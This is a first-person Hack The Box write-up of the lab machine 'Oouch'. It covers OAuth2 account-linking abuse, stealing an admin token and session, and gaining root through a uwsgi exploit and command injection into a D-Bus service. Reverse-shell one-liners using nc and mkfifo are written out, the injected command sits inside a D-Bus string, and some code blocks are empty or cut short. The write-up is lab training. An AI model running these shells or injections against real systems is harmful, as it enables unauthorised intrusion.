## HTB - Oouch

## Overview

![](/assets/img/1-oouch-infocard.png)

This had difficulty Linux machine taught me a lot about the internal workings of a federated access control system, specifically an implementation of Oauth2.  Persistence and the ability to take error messages and learn from them were necessary to progress through this machine.

## Useful Skills and Tools

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.177`.  The options I regularly use are: 

| `Flag` | Purpose |
| :--- | :--- |
| `-p-` | A shortcut which tells nmap to scan all ports |
| `-vvv` | Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown |
| `-sC` | Equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target |
| `-sV` | Does a service version scan |
| `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |

```bash
zweilos@kalimaa:~/htb/oouch$ nmap -p- -sC -sV -oA oouch 10.10.10.177

#### Anonymous FTP

When doing my initial reconnaissance, I prefer to test for anonymous access to remote access and file sharing services such as ftp, telnet, and SMB before tacking more time and resource intensive services.  In this case since port 21 was open, my first step was to login to FTP as `anonymous`.  

```http
zweilos@kalimaa:~/htb/oouch$ ftp 10.10.10.177

Connected to 10.10.10.177. 
220 qtc's development server 
Name (10.10.10.177:zweilos): anonymous 
230 Login successful.

200 PORT command successful. Consider using PASV.

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
226 Directory send OK.
ftp> quit
221 Goodbye.
```

There was only one file, `project.txt` on the server, and I couldn't navigate anywhere else.

```text
zweilos@kalimaa:~/htb/oouch$ cat project.txt
Flask -> Consumer
Django -> Authorization Server
```

The contents of the file revealed that `Flask` and `Django` were the two types of frameworks for the different services on some project. Doing a bit of quick reading revealed that [Flask](https://flask.palletsprojects.com/) and [Django](https://www.djangoproject.com/) are python-based frameworks for building web apps.

Next I checked SSH, but it did not allow me to connect without a private key _\(I did note that there is no password required though\)_.

```text
zweilos@kalimaa:~/htb/oouch$ ssh 10.10.10.177
zweilos@10.10.10.177: Permission denied (publickey).
```

### Website on port 5000

The next open port on my list was 5000.  This is a non-standard port and could have been anything, but Nmap reported that there was an Nginx server hosting an HTTP server there, so I fired up my browser to check it out.  Navigating to `http://10.10.10.177:5000` led to a pretty bare-bones login page.

![](/assets/img/screenshot_2020-06-09_15-36-13.png)

## Initial Foothold

First, I tested a few common default logins such as 'admin:admin' but that didn't get me anywhere.  From there I went to the `Register` page, created an account, logged in, and started looking around the site. 

![](/assets/img/Screenshot_2020-06-09_15-38-03.png)

There was not much to do on most of the internal pages, though there was an interesting "send a message to the administrator" type input box on the `/contact` page.

![](/assets/img/screenshot_2020-06-09_15-41-13.png)

Attempting to check for XSS on the contact page using `javascript:alert(document.cookie)` resulted in: `"Hacking Attempt Detected"` and a one minute IP ban \(see screenshot below\). Sending the word 'JavaScript' was fine...but sending just the word 'alert' also triggered this message...I decided there must be some sort of filter, WAF, or IPS.

![](/assets/img/screenshot_2020-06-09_16-04-27.png)

Next I used Gobuster to search for more accessible directories and found an `/oauth` page. `http://10.10.10.177:5000/oauth` led to a "hidden" page with the following links:

![](/assets/img/screenshot_2020-06-10_10-17-42.png)

> * In order to connect your account:`http://consumer.oouch.htb:5000/oauth/connect`
> * Once your account is connected, login here:`http://consumer.oouch.htb:5000/oauth/login`

### Website on port 8000

After clicking the `/connect` link, I was redirected to `http://authorization.oouch.htb:8000/login/`. I added each of the newly found domains to my `/etc/hosts` file so I could proceed.

```text
10.10.10.177    oouch.htb
10.10.10.177    consumer.oouch.htb
10.10.10.177    authorization.oouch.htb
```

I didn't have any credentials that worked for the authorization site, so I began poking around to see if there was a way to register. The register link was at the root at `http://authorization.oouch.htb:8000/`.

### The Oauth2 server

![](/assets/img/screenshot_2020-06-10_11-16-23.png)

I found these sites to be useful while doing research on the Oauth2 protocol:

> * [https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/](https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/)
> * [https://aaronparecki.com/oauth-2-simplified/](https://aaronparecki.com/oauth-2-simplified/)
> * [RFC 6749: The OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)

After creating an account and logging in, I was greeted with two API links `/oauth/get_user` and `/oauth/token`.

![](/assets/img/screenshot_2020-06-13_07-09-34.png)

The two links didn't seem to do anything yet \(according to my research I needed a higher privilege authorization token\).  I needed a way to get this token from a higher privilege user, and the only thing I could think of that I had found related to a site admin was the `/contact` page on the port 5000 site. Since the `/oauth` page had a method labeled "connect", I figured the path forward must involve using oauth2 to link my account to the admin account.  

After a lot of trial and error and lots of reading of the Oath2 documentation I figured out how to pause the authorization process to connect two accounts in the middle just before the final step.  This makes it so the account is in a state where you have an authorization to connect token that is supposed to be sent to the authorized service to connect to.  Since this token is sent in the URL, it is trivial to send it as a link to other people in order to link my account to one of my choice.  

In order to exploit this, I first went back to original account on `http://consumer.oouch.htb:5000/` to use the `/connect` link on the `/oauth` page to authorize my two accounts to connect \(the one on the consumer page on port 5000 and the Oauth2 internal account on port 8000\). 

![](/assets/img/oouch8.png)

Using Burp to intercept all browser requests, I allowed each of the requests to pass until got to the button to authorize the connect.  I then clicked the button, allowed the POST to the server in Burp,

```http
POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1

```

...then intercepted the GET request that contained the authorization link, and dropped the request in Burp so it wouldn't authorize the two accounts to be linked. I needed to start the authorization process in order to get that link  I could use to get any other account to connect to mine.

## Road to User

### Server-side Request Forgery \(SSRF\)

Next, I needed to get the admin to link his account to mine in order to escalate my privileges. I went back to the `http://consumer.oouch.htb:5000/contact` page, and sent the admin the link with my authorization token request link, which was already activated through the POST message earlier. All I needed was for the admin to click the link to connect our accounts. This was an example of an attack called [Server-side Request Forgery \(SSRF\)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery).

![](/assets/img/oouch13.png)

I sent the following link to the admin, and hoped that there was some way that they would click it: `http://consumer.oouch.htb:5000/oauth/connect/token?code=4GCuHQ0LTjKkezQmz2jlolgHxfLXbc` _\(copied from the url bar after Burp dropped the `GET` earlier\)._  

![](/assets/img/oouch10.png)

After getting a message thanking me for my feedback to the admin, I used the link `http://consumer.oouch.htb:5000/oauth/login` from the `/oauth` page to authorize the account connection.


> Note: You have to log in fast otherwise the token expires!


![](/assets/img/screenshot_2020-06-10_15-42-54.png)

The `/profile` page now showed was logged in as the user `qtc` with my oauth2 account linked to it.

### Finding the developer creds

I noticed on the `/documents` page I now had the following items listed:

> Hello qtc! You have currently following documents stored:
>
> * dev\_access.txt        **develop:supermegasecureklarabubu123!** -&gt; Allows application registration.
> * o\_auth\_notes.txt    /api/get\_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method.
> * todo.txt            Chris mentioned all users could obtain my ssh key. Must be a joke...

I now had some credentials for a `develop` user but I wasn't sure where to use them, other than they were good for registering an application. 

I turned to gobuster once again to search for more directories, and found `/oauth/applications/register/` which gave me an HTTP basic authentication login prompt where I used the develop creds from the `/documents` page.  

![](/assets/img/oouch17.png)

After logging in I was given a page where I could register a new application.  I went back and did some more research on registering web applications and found information for both Django and Flask.  

> [https://django-registration.readthedocs.io/en/3.1/quickstart.html](https://django-registration.readthedocs.io/en/3.1/quickstart.html) - Programming information about registering Django apps

> [https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html](https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html) - how to register a new Flask application

You can apparently set the authorization link to redirect wherever you want. By setting the redirect URL to be my local machine, I could then listen for a connection with netcat and see if it returned any interesting information.

_I forgot the port on my redirect URL while filling out the request the first time. Luckily there was an edit button!_

![](/assets/img/screenshot_2020-06-11_02-20-00.png)

Side note: After creating an app and clicking "Go Back" it prompts for basic authentication with the text “Oouch Admin Only” at URL `http://authorization.oouch.htb:8000/oauth/applications/`. The `develop` creds did not work here.

![](/assets/img/oouch20.png)

My web app registration request looked like this in Burp:

```http

```

After allowing the POST request with my credentials I was redirected to a GET request to the register page.

```http
GET /accounts/login/?next=/oauth/applications/register/ HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

```

I then sent an authorization request to the server to connect to the app I 'created', which I hoped would redirect to my netcat listener:

```http

```

I got a connection on my listener!

```bash
zweilos@kalimaa:~/htb/oouch$ nc -lvnp 1234 > djangoapp

connect to [10.10.14.253] from (UNKNOWN) [10.10.14.253] 53300
```

The connection only sent an error message, but it was enough to see that it worked how I wanted and gave me a clue as to what I needed to send to get a proper response.

```http
GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1

```

After seeing that I could get a connection from the server, I once again tried sending my request in a link to the admin on the `http://consumer.oouch.htb:5000/contact` page to see if we could use SSRF again to get any further info.

```bash
http://authorization.oouch.htb:8000/oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS
```

And I got a reply!

I now had a session cookie from the admin.  Since I was already logged in as `qtc` on the consumer portal, I used this cookie to see if I could to log into `http://authorization.oouch.htb:8000/` as `qtc`

It worked! Now that I had a higher privilege oauth2 account, I decided it was time to try out those endpoint links to get an authorization token from `/oauth/token`  to access the API `/oauth/get_user` I saw earlier.

Next I did some more oauth2 research, in particular on authenticating to APIs:

My first attempts failed:

```http

I kept getting `"invalid_grant_type"` and `"invalid_client"` errors, until I did some more reading and found out that the the request cannot have newlines in it!

```

### Finding user creds

I got the access token! I then tried to use the token to get info from the `/oauth/get_user` API, but got back nothing useful. After playing around with it, I thought back to the the note on qtc's `/documents` page that mentioned easy user access to the SSH key and  substituted `get_user` with `get_ssh`. 

```http

I got an SSH key for the user `qtc`!  Annoyingly, it was on a single line and had a lot of `\n` characters in it that had to be fixed.

The next step was to use SSH to login to the machine. The command `ssh -i <private_key_file>` __lets you use a private key to login.

Implementing an IPS using DBus and iptables == Genius?
```

I got the `user.txt`! There was also a hidden file named `.note.txt` that mentioned using `DBus` and `iptables` to implement an IPS.

## Path to Power \(Gaining Administrator Access\)

### Enumeration as user - `qtc`

While enumerating I found a configuration file named `htb.oouch.Block.conf` in the Dbus configuration files.  I figured this must be related to that hidden note I found about an IPS using Dbus.  

```bash
qtc@oouch:/etc/dbus-1/system.d$ ls
bluetooth.conf                      htb.oouch.Block.conf             wpa_supplicant.conf
com.ubuntu.SoftwareProperties.conf  org.freedesktop.PackageKit.conf

qtc@oouch:/etc/dbus-1/system.d$ cat htb.oouch.Block.conf
```

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

        <policy user="www-data">
                <allow send_destination="htb.oouch.Block"/>
                <allow receive_sender="htb.oouch.Block"/>
        </policy>

</busconfig>
```

So the user `www-data` can send and receive on dbus using `htb.oouch.Block`, but I wasn't sure how to use this right then. 

In the output from the command `ip a` I noticed that there were Docker containers running in the `172.17.0.1/16` range.  I wondered if `qtc` was able to connect to one.  

```bash
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
    link/ether 02:42:f9:aa:6c:dd brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-cc6c78e0c7d0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:61:5e:2b:bf brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:61ff:fe5e:2bbf/64 scope link
       valid_lft forever preferred_lft forever
```

The answer was yes! It took a few tries to find an IP I could connect to \(`172.18.0.5`\), though.  


> Side note: After going back in to validate my notes, I noticed that the final octet of the container IP seems to be randomized. It was **`172.178.0.4`** the next time I did it.

After connecting through SSH with the same OpenSSH key for user `qtc`, I began enumerating the docker container.   The `/code` folder in the root looked interesting...

-rw-r--r-- 1 root root  163 Feb 11 17:34 uwsgi.ini
```

There were lots of interesting looking files in this directory.

```bash
qtc@aeb4525789d8:/code$ cat requirements.txt 
Flask==1.0.2
Flask-Bootstrap==3.3.7.1
Flask-Login==0.4.1
Flask-Migrate==2.5.2

Flask-WTF==0.14.2
uWSGI==2.0.17.1
Werkzeug==0.14.1
requests==2.20.1
geojson==2.5.0
jsonschema==2.6.0
simplejson==3.16.0
mysqlclient==1.4.4
```

The file `requirements.txt` gave a listing of the dependencies and versions of the software needed to run the websites, so perhaps there was something I could use to find an exploit.

```python
qtc@aeb4525789d8:/code$ cat config.py
import os

basedir = os.path.abspath(os.path.dirname(__file__))

class Config(object):
    # ...
    SQLALCHEMY_DATABASE_URI = 'mysql://qtc:clarabibi2019!@database.consumer.oouch.htb/Consumer'
    SQLALCHEMY_TRACK_MODIFICATIONS = False

    SECRET_KEY = os.environ.get('SECRET_KEY') or 'klarabubuklarabubuklarabubuklarabubu'
```

The MySQL creds in `config.py` file looked interesting...though I'm not sure if it was another route to root or a rabbit hole. I forgot about it until after I had gotten root and never used them.

```bash
qtc@aeb4525789d8:/code$ cat uwsgi.ini 
[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true
```

The `uwsgi` service was running on the `oouch`box, and I also found the `wsgi.ini` file in the Docker container. Apparently it runs in the context of the `www-data` user, which we saw earlier in the `htb.oouch.Block.conf`. I checked to see if there were any exploits for this service and found: [https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi\_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)

I then tried to run the exploit to try to get a reverse shell:

```bash
zweilos@kalimaa:~/htb/oouch$ python3 ./uwsgi.py http://10.10.10.177:5000 -c " nc -e /bin/sh 10.0.0.1 1234"
usage: uwsgi.py [-h] [-m [{http,tcp,unix}]] -u [UWSGI_ADDR] -c [COMMAND]
uwsgi.py: error: the following arguments are required: -u/--uwsgi
```

The `uwsgi` service runs from the docker container so I couldn't figure out how to get this exploit to connect to my Kali machine easily. I used SCP to copy the exploit into the container \(along with a version of nc since it wasn't installed.\)


> Note: make sure to put the `:` after the IP and before the folder name; it won't work otherwise.

`uwsgi.socket` was in `/tmp` so I had my `--uwsgi` argument taken care of, but then encountered an error while running the exploit:

```bash
qtc@aeb4525789d8:/tmp$ python ./uwsgi.py -m unix -u uwsgi.socket -c "nc -e /bin/sh 10.0.0.1 1234"
[*]Sending payload.
Traceback (most recent call last):

  File "./uwsgi.py", line 143, in main
    print(curl(args.mode.lower(), args.uwsgi_addr, payload, '/testapp'))
  File "./uwsgi.py", line 110, in curl
    return ask_uwsgi(addr_and_port, mode, var)
  File "./uwsgi.py", line 77, in ask_uwsgi
    s.send(pack_uwsgi_vars(var) + body.encode('utf8'))
  File "./uwsgi.py", line 26, in pack_uwsgi_vars

  File "./uwsgi.py", line 18, in sz
    if sys.version_info[0] == 3: import bytes
ModuleNotFoundError: No module named 'bytes'
```

Fortunately commenting out the lines that referenced the `bytes` module solved the problem and the code ran. I still wasn't able to get a shell back to my box from the docker container, so tried sending it to the `oouch` box instead.

```bash
qtc@aeb4525789d8:/tmp$ python ./uwsgi.py -m unix -u uwsgi.socket -c "/tmp/nc -e /bin/sh 172.18.0.1 1234"
[*]Sending payload.
```

...it worked, and, I got a connection on my netcat listener I set up back on `qtc@oouch`. 


> _If you are wondering how I was able to do this, I had another terminal open and set up another SSH connection to the_ **`oouch`** _machine from my localhost.  If you didn't know, you can login to the same machine multiple times with SSH \(not sure what the technical limit may be\)._  


```bash
listening on [any] 1234 ...
connect to [172.18.0.1] from (UNKNOWN) [172.18.0.5] 53934
whoami && hostname
www-data
aeb4525789d8
```

Now that I was logged in as `www-data`, I needed to see if that dbus configuration file I found earlier could come in handy. It mentioned interacting with dbus and the `htb.oouch.block` app. The code below was from `routes.py` found in the `/code/oouch` directory of the docker container and showed the information needed to craft my message to DBus. _\(I also think this was the filter that was blocking my early XSS attempts on the `/contact` page\)._

```python
# First apply our primitive xss filter
        if primitive_xss.search(form.textfield.data):
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

            client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)  
            response = block_iface.Block(client_ip)
            bus.close()
            return render_template('hacker.html', title='Hacker')
```

I found some examples of how to craft the exploit message on GitHub at [https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b](https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b). There was also a related POC that exploits a kernel module \(which I didn't do for this challenge\) at [https://www.exploit-db.com/exploits/36820](https://www.exploit-db.com/exploits/36820).

The example exploit command and reply were as follows:

```bash
dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,"foo",XAUTHORITY,"foo",LD_PRELOAD,"/tmp/test.so"

method return sender=:1.4364 -> dest=:1.7427 reply_serial=2
```

My test code and the services reply:

```bash
dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"echo whoami;"

method return time=1591881935.932055 sender=:1.2 -> destination=:1.1283 serial=7 reply_serial=2
   string "Carried out :D"
```

The reply `string "Carried out :D"` made it look like I was on the right track, even though I didn't see any echo.  I figured that the standard-out was not being sent back to my terminal and that was why I wasn't able to see my test work.

I then tried substituting the `echo whoami` command for a reverse shell:

```bash
dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.253 1234 >/tmp/f"
```

I still couldn't reach my home box from the container...but I thought that maybe I could send this shell to `qtc@oouch` again.


> Note: It also needed `;` on the end of the string for some reason!! This certainly took a little while to troubleshoot and discover.


### Getting a root shell

My final working exploit:

```text
dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.1 1234 >/tmp/f;"

method return time=1591882762.569865 sender=:1.2 -> destination=:1.1325 serial=15 reply_serial=2
   string "Carried out :D"
```

I'm in!  The service spawned a reverse shell connection back to my waiting netcat listener on the `oouch` machine.  


> Looking back, I probably could have used an SSH tunnel to connect through from my local host, but I didn't know how to do that back when I first rooted this machine.  


### Root.txt

```bash
qtc@oouch:/etc/dbus-1/system.d$ nc -lvnp 1234
